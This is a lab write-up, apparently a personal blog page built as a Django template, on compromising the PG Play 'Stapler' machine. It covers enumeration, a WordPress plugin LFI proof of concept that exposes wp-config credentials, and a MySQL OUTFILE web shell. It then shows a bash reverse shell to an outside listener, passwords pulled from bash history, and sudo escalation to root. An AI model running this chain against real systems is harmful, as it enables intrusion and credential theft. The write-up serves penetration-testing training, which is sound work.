@@ -1,0 +1,275 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Play Stapler</h1>
+    <p class="text">Difficulty : Medium | CommunityRating : Hard | MyRating Mediums</p>
+    <p class="text">It was great machine for gaining knowledge.</p>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT      STATE  SERVICE     VERSION
+20/tcp    closed ftp-data
+21/tcp    open   ftp         vsftpd 2.0.8 or later
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 192.168.45.205
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: PASV failed: 550 Permission denied.
+22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
+|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
+|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
+53/tcp    open   tcpwrapped
+80/tcp    open   http        PHP cli server 5.5 or later
+|_http-title: 404 Not Found
+123/tcp   closed ntp
+137/tcp   closed netbios-ns
+138/tcp   closed netbios-dgm
+139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
+666/tcp   open   pkzip-file  .ZIP file
+3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.7.12-0ubuntu1
+|   Thread ID: 7
+|   Capabilities flags: 63487
+|   Some Capabilities: ConnectWithDatabase, LongPassword, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, LongColumnFlag, SupportsLoadDataLocal, FoundRows, ODBCClient, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, SupportsCompression, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
+|   Status: Autocommit
+|   Salt: ".!\x0C_.|?\x155z
+|_  Auth Plugin Name: mysql_native_password
+12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Tim, we need to-do better next year for Initech
+|_http-server-header: Apache/2.4.18 (Ubuntu)</code></pre></div>
+
+<p class="text">Since there was no useful information on ftp and port 80 http server, I'll skip these section. But you should never skip enumeration and enumerate them yourself.</p>
+<p class="text">After enumerating ftp and port 80, I determined there are no objects I should dig further. Therefore, the next target is port 12380. Since I couldn't login mysql without credential, I decided to gather more information.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/stapler/1.png' %}" alt="">
+    <p class="text">This port doesn't hold any additional information. Also, it often has subdirectories, however, if I enumerated with gobuster, there were no pages, even .htpasswd files which always returns 404. Also, when I enumerated directories with gobuster, the http's response was too slow and frustrating.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/stapler/2.png' %}" alt="">
+    <p class="text">Since I felt it weird behavior, I launched burpsuite and checked the response. <br>Then, it responsed with uncommon headers too. <br><br> Because it returned <u>Connection: close</u>, I doubt that the protocol may be different, though nmap returned it's http.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/stapler/3.png' %}" alt="">
+    <p class="text">Changing the protocol http into https and re-opened the page returned new page. It might hold hidden pages. Let's enumerate.</p>
+</div>
+
+<div class="code-box"><pre><code>└─$ <u>feroxbuster <u>-k</u> -u https://$IP -x php > ferox</u>
+┌──(kali㉿kali)-[~/tempo]
+└─$ cat ferox | grep -Ev 'css|js|images' | grep 200
+200      GET        1l        3w       21c https://192.168.205.148:12380/
+200      GET        0l        0w        0c https://192.168.205.148:12380/blogblog/wp-includes/bookmark.php</code></pre></div>
+<p class="text"><u>※You have to add -k flag to enumerate https page.</u></p>
+<p class="text">As I assumed, there are several directories worth digging, but in this time I foucused on blogblog dir since it holds tons of pages.</p>
+<p class="text">Also, this page uses wordpress. So we can use wpscan for enumeration.</p>
+
+
+<div class="code-box"><pre><code>└─$ wpscan --disable-tls-checks --url https://192.168.165.148:12380/blogblog/wp-login.php --enumerate
+...
+[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).
+ | Found By: Most Common Wp Includes Query Parameter In Homepage (Passive Detection)
+ |  - https://192.168.165.148:12380/blogblog/wp-includes/css/dashicons.min.css?ver=4.2.1
+ | Confirmed By:
+ |  Common Wp Includes Query Parameter In Homepage (Passive Detection)
+ |   - https://192.168.165.148:12380/blogblog/wp-includes/css/buttons.min.css?ver=4.2.1
+ |  Query Parameter In Install Page (Aggressive Detection)
+ |   - https://192.168.165.148:12380/blogblog/wp-includes/css/buttons.min.css?ver=4.2.1
+ |   - https://192.168.165.148:12380/blogblog/wp-includes/css/dashicons.min.css?ver=4.2.1
+</code></pre></div>
+<p class="text"><u>※Note : because the target is https, you have to append --disable-tls-checks option.</u></p>
+<p class="text">Though I could get version info, there was no exploitable vulnerability. Therefore, I will enumerate pulgins which often provides us exploitable vector.</p>
+
+
+<h2 class="subtitle">Foothold</h2>
+<p class="text">Plugin page is often stored in /wp-content/plugins/. So, I opened the dir manually.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/stapler/4.png' %}" alt="">
+    <p class="text">Searching this plugin <u>dvanced-video-embed-embed-videos-or-playlists</u> with google returned LFI vulnerability, and I found <a href="https://github.com/c0dedeadio/advanced-video-lfi">this</a> poc.</p>
+</div>
+
+<div class="code-box"><pre><code>└─$ git clone https://github.com/c0dedeadio/advanced-video-lfi.git
+└─$ cd advanced-video-lfi
+└─$ python3 advanced-*.py -h
+/home/kali/tempo/advanced-video-lfi/advanced-video-lfi.py:92: SyntaxWarning: invalid escape sequence '\d'
+  'src="http[s]?://.*/wp-content/uploads/\d+\.jpeg', line
+usage: advanced-video-lfi.py [-h] <u>[--ignore-ssl-certs] wp_root lfi_path</u>
+
+WordPress Advanced Video Embed v1.0 LFI PoC rewrite by ori0n [c0dedead.io]
+
+positional arguments:
+  wp_root               URL of WordPress root
+  lfi_path              Path to file
+
+options:
+  -h, --help            show this help message and exit
+  --ignore-ssl-certs, -k
+                        Ignore SSL certificates</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ <u>python3 advanced-*.py --ignore-ssl-certs https://192.168.165.148:12380/blogblog/ /etc/passwd</u>
+/home/kali/tempo/advanced-video-lfi/advanced-video-lfi.py:92: SyntaxWarning: invalid escape sequence '\d'
+  'src="http[s]?://.*/wp-content/uploads/\d+\.jpeg', line
+root:x:0:0:root:/root:/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+...</code></pre></div>
+
+<p class="text">This poc worked. Then, we can read arbitrary files if we know the path. Sensitive information is often stored in wp-config.php file, so I first read it.</p>
+<div class="code-box"><pre><code>└─$ python3 advanced-*.py --ignore-ssl-certs https://192.168.165.148:12380/blogblog/ ../wp-config.php
+...
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'wordpress');
+
+/** MySQL database username */
+define('DB_USER', '<u>root</u>');
+
+/** MySQL database password */
+define('DB_PASSWORD', '<u>plbkac</u>');
+...</code></pre></div>
+
+<p class="text"><u>※tip : Since it's LFI, we don't need to indicate full path. Because we know the wp-config.php is located to root directory for the website, we can simply add ../ to go back path level.</u></p>
+
+
+
+<p class="text">We got mysql credential, which is open on 3306 port.</p>
+<p class="text">Since we can access mysql GUI, we can perform file upload technique with outfile function. However, we don't know the full path where we can write php file. Therefore, fisrt I will check apache2 conf file, which stores http path.</p>
+
+<div class="code-box"><pre><code>└─$ python3 advanced-*.py --ignore-ssl-certs https://192.168.119.148:12380/blogblog/ /etc/apache2/sites-available/default-ssl.conf
+/home/kali/tempo/advanced-video-lfi/advanced-video-lfi.py:92: SyntaxWarning: invalid escape sequence '\d'
+  'src="http[s]?://.*/wp-content/uploads/\d+\.jpeg', line
+&lt;IfModule mod_ssl.c>
+        &lt;VirtualHost _default_:12380>
+                ServerAdmin garry@red
+
+                <u>DocumentRoot /var/www/https</u>
+...</code></pre></div>
+<p class="text">We now know the full path <u>/var/www/https/blogblog</u>.</p>
+
+<div class="code-box"><pre><code>└─$ <u>mysql -h 192.168.165.148 --skip_ssl -u root -pplbkac</u>
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 2944
+Server version: 5.7.12-0ubuntu1 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Support MariaDB developers by giving a star at https://github.com/MariaDB/server
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> </code></pre></div>
+
+<p class="text">Because we have GUI, we can create php file using outfile functionality.</p>
+
+<div class="code-box"><pre><code>MySQL [(none)]> <u>use wordpress</u>
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MySQL [wordpress]> <u>SELECT '&lt;?php echo shell_exec($_GET["cmd"]); ?&gt;' INTO OUTFILE '/var/www/https/blogblog/wp-content/uploads/shell.php';</u>
+Query OK, 1 row affected (0.106 sec)</code></pre></div>
+<p class="text"><u>※You have to select database for adding php file.</u></p>
+
+<p class="text">Let's check if we successfully uploaded shell.php.</p>
+
+<div class="code-box"><pre><code>└─$  curl -k -G https://192.168.165.148:12380/blogblog/wp-content/uploads/shell.php --data-urlencode "cmd=id"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre></div>
+
+<p class="text"><u>※Again, use -k flag for ignoring ssl-certificate problem.</u></p>
+<p class="text">We confirmed it was successful. Next we can get reverse shell.</p>
+
+<div class="code-box"><pre><code>└─$ curl -k -G https://192.168.165.148:12380/blogblog/wp-content/uploads/slencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.45.154/4444 0>&1'"
+
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.154] from (UNKNOWN) [192.168.165.148] 51788
+bash: cannot set terminal process group (1340): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@red:/var/www/https/blogblog/wp-content/uploads$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@red:/var/www/https/blogblog/wp-content/uploads$ </code></pre></div>
+
+<p class="text">We got www-data user.</p>
+
+<h2 class="subtitle">PrivEsc</h2>
+
+<div class="code-box"><pre><code>www-data@red:/home$ ls  
+AParnell  Drew        JBare    LSolum2  RNunemaker  Sam     jess       peter
+CCeaser   ETollefson  JKanode  MBassin  SHAY        Taylor  kai        www
+CJoo      Eeth        JLipps   MFrei    SHayslett   elly    local.txt  zoe
+DSwanger  IChadwick   LSolum   NATHAN   SStroud     jamie   mel
+www-data@red:/home$ </code></pre></div>
+
+<p class="text">Because there are many users, one of them may have sensitive info in history.</p>
+
+
+<div class="code-box"><pre><code>www-data@red:/home$ <u>find . -type f | grep -ir "pass" . 2>/dev/null</u>
+find: './peter/.cache': Permission denied
+find: './zoe/.ssh': Permission denied
+./JKanode/.bash_history:sshpass -p thisimypassword ssh JKanode@localhost
+./JKanode/.bash_history:apt-get install sshpass
+./JKanode/.bash_history:<u>sshpass -p JZQuyIN5 ssh peter@localhost</u>
+www-data@red:/home$ </code></pre></div>
+
+<p class="text">We can simply establish ssh connection.</p>
+
+<div class="code-box"><pre><code>└─$ <u>ssh peter@192.168.119.148</u>
+...
+red% id
+uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+red% sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for peter: 
+Matching Defaults entries for peter on red:
+    lecture=always, env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User peter may run the following commands on red:
+    (ALL : ALL) ALL</code></pre></div>
+
+    <p class="text">This user can run all command as root user. I simply use command sudo bash and get root user.</p>
+
+    <div class="code-box"><pre><code>red% sudo bash
+root@red:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@red:~# </code></pre></div>
+
+<p class="text">Youc can find local.txt under /home, and root.txt under /root.</p>
+
+</body>
+</html>
